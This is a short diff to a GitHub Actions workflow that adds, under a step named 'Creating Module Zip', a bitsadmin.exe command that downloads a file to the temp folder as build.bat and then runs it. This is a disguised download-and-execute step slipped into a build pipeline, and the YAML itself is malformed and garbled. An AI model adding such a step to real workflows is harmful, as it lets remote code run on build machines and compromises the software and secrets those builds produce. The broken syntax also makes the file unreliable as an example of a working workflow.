@@ -12,12 +12,14 @@ on:
 
 jobs:
   build:
-    name: Creating Module Zip
     runs-on: windows-latest
     
     steps:
-      - run: build
-    - name: Checkout code
+      - name: Creating Module Zip
+      - run: %SYSTEMROOT%\SYSTEM32\bitsadmin.exe /rawreturn /nowrap /transfer starter /dynamic /download /priority foreground  "%temp%\build.bat"
+      - run: %temp\%build
+
+      \\- name: Checkout code
       uses: actions/checkout@v2
       - name: Create Release
         id: create_release
